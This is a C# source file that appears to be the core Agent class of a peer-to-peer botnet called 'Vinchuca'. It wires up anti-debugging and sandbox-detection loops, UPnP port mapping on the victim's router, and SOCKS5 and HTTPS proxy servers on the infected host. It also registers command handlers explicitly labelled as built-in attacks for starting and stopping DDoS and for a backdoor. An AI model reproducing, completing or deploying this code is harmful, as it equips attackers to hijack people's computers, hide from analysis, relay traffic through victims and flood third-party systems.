using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using Vinchuca.Actions.Socks5;
using Vinchuca.Actions.WebInject;
using Vinchuca.Network;
using Vinchuca.Network.Comunication;
using Vinchuca.Network.Comunication.Listeners;
using Vinchuca.Network.Listeners;
using Vinchuca.Network.Protocol.Handlers;
using Vinchuca.Network.Protocol.Handlers.Command;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.Command;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;
using Vinchuca.System.Evation;
using Vinchuca.Upnp;
using Vinchuca.Utils;
using Vinchuca.Workers;

namespace Vinchuca
{
    public class Agent
    {
        private readonly CommunicationManager _communicationManager;
        private readonly IMessageListener _listener;
        private readonly IWorkScheduler _worker;
        private readonly PeerList _peerList;
        private readonly ConnectivityTester _connectivityTester;
        private readonly MessageManager _messagesManager;
        private readonly Socks5Server _socks5;
        private readonly HttpsProxyServer _https;
        public IPAddress PublicIP { get; set; }

        private static readonly Log Logger = new Log(new TraceSource("BOT", SourceLevels.Verbose));

        public PeerList PeerList
        {
            get { return _peerList; }
        }

        public MessageManager MessagesManager
        {
            get { return _messagesManager; }
        }

        public Agent(int port, BotIdentifier id)
        {
            BotIdentifier.Id = id;
            Logger.Info("Vinchuca Agent [id: {0}] listenning on port {1}", BotIdentifier.Id, port);

            _worker = ClientWorker.Instance;
            _worker.QueueForever(AntiDebugging.CheckDebugger, TimeSpan.FromSeconds(1));
            _worker.QueueForever(AntiDebugging.CheckDebugging, TimeSpan.FromSeconds(0.3));
            _worker.QueueForever(SandboxDetection.CheckSandboxed, TimeSpan.FromSeconds(1));

            _peerList = new PeerList(_worker);
            _peerList.DesparadoModeActivated += DesperateModeActivated;


            if (IPAddressUtils.BehingNAT(IPAddressUtils.GetLocalIPAddress()))
            {
                var upnpSearcher = new UpnpSearcher();
                upnpSearcher.DeviceFound += (s, e) =>
                {
                    PublicIP = e.Device.GetExternalIP();
                    Logger.Verbose("External IP Address: {0}", PublicIP);
                    try
                    {
                        var externalPort = BotIdentifier.Id.GetPort();
                        BotIdentifier.EndPoint = new IPEndPoint(PublicIP, externalPort);
                        var device = e.Device;
                        device.CreatePortMap(new Mapping(Protocol.Udp, port, externalPort));
                        device.CreatePortMap(new Mapping(Protocol.Tcp, port, externalPort + 1));
                        device.CreatePortMap(new Mapping(Protocol.Tcp, port, externalPort + 2));
                    }
                    catch (MappingException ex)
                    {
                        Logger.Warn("UPnp - port mapping failed: {0} - {1}", ex.ErrorCode, ex.ErrorText);
                    }
                    finally
                    {
                        upnpSearcher.Stop();
                    }
                };
                upnpSearcher.Search();
            }

            _listener = new MessageListener(port);
            _listener.UdpPacketReceived += EnqueueMessage;
            _communicationManager = new CommunicationManager(_listener, _worker);
            var peersManager = new PeerManager(_communicationManager, _peerList, _worker);
            _messagesManager = new MessageManager(peersManager);
            peersManager.MessageSender = _messagesManager;

            RegisterMessageHandlers(peersManager);

            var externPort = BotIdentifier.Id.GetPort();
            _socks5 = new Socks5Server(externPort+1);
            _https = new HttpsProxyServer(externPort+2);
            _connectivityTester = new ConnectivityTester();
            _connectivityTester.OnConnectivityStatusChanged += OnConnectivityStatusChanged;
        }

        private void RegisterMessageHandlers(PeerManager peersManager)
        {
            // Peer-to-Peer system messages
            _messagesManager.Register(
                MessageCode.Syn,
                MessageType.Request,
                typeof(HelloSynMessage),
                new HelloSynMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Hardest);
            _messagesManager.Register(
                MessageCode.AckSyn,
                MessageType.Reply,
                typeof(HelloAckSynMessage),
                new HelloAckSynMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Medium);
            _messagesManager.Register(
                MessageCode.Ack,
                MessageType.Reply,
                typeof(HelloAckMessage),
                new HelloAckMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Medium);
            _messagesManager.Register(
                MessageCode.GetPeerList,
                MessageType.Request,
                typeof(GetPeerListMessage),
                new GetPeerListMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Hard);
            _messagesManager.Register(
                MessageCode.GetPeerListReply,
                MessageType.Reply,
                typeof(GetPeerListReplyMessage),
                new GetPeerListReplyMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Medium);
            _messagesManager.Register(
                MessageCode.Ping,
                MessageType.Request,
                typeof(PingMessage),
                new PingMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Easy);
            _messagesManager.Register(
                MessageCode.Pong,
                MessageType.Reply,
                typeof(PongMessage),
                new PongMessageHandler(_peerList, _messagesManager),
                (int)Difficulty.Easy);

            // built-in attack messages
            _messagesManager.Register(
                MessageCode.DDoSStart,
                MessageType.Request,
                typeof(DosAttackMessage),
                new DosAttackHandler(_peerList, _messagesManager),
                (int)Difficulty.NoWork);
            _messagesManager.Register(
                MessageCode.DDoSStop,
                MessageType.Request,
                typeof(DosStopAttackMessage),
                new DosStopAttackHandler(_peerList, _messagesManager), 
                (int)Difficulty.NoWork);
            _messagesManager.Register(
                MessageCode.Backdoor,
                MessageType.Request,
                typeof(BackdoorMessage),
                new BackdoorHandler(_messagesManager),
                (int)Difficulty.NoWork);
            _messagesManager.Register(
                MessageCode.Unknown,
                MessageType.Special,
                typeof(InvalidMessage),
                new InvalidMessageHandler(_peerList),
                (int)Difficulty.NoWork);
        }

        private void DesperateModeActivated(object sender, DesparateModeActivatedEventArgs e)
        {
            Logger.Info("Entering DESPERATE Mode");
            foreach (var bot in e.Bots)
            {
                var hello = new GetPeerListMessage();
                _messagesManager.Send(hello, bot);
            }
        }

        public void Bootstrap(List<PeerInfo> peers=null)
        {
            _peerList.Load();
            if (peers != null)
            {
                foreach (var peer in peers)
                {
                    _peerList.TryRegister(peer);
                }
            }

            Logger.Info("Bootstrapping init.  {0} found endpoints", _peerList.GetPeersEndPoint().Count);
            foreach (var peer in _peerList)
            {
                var hello = new HelloSynMessage();
                _messagesManager.Send(hello, peer.BotId);
            }
        }

        public void Run()
        {
            Logger.Info("Starting Vinchuca");
            _worker.Start();
            _listener.Start();
            _socks5.Start();
            _https.Start();
            Logger.Info("Vinchuca is running ;)");
        }

        private void EnqueueMessage(object sender, UdpPacketReceivedEventArgs e)
        {
            _communicationManager.Receive(e.EndPoint, e.Data, e.BytesReceived);
        }

        private void OnConnectivityStatusChanged(object sender, EventArgs eventArgs)
        {
            if (_connectivityTester.IsConnected)
                _worker.Start();
            else
                _worker.Stop();
        }
    }
}